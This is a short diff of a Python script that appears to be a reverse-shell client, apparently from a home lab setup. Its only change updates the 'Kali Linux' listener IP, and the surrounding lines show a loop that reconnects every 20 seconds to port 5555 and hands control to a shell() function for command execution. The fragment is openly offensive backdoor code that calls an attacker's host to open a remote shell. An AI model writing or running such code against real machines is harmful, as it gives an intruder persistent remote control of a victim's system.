@@ -47,7 +47,7 @@ def connection():
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
-            s.connect(('192.168.56.100', 5555))  # Update this to your Kali IP
+            s.connect(('192.168.56.104', 5555))  # Update this to your Kali IP
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
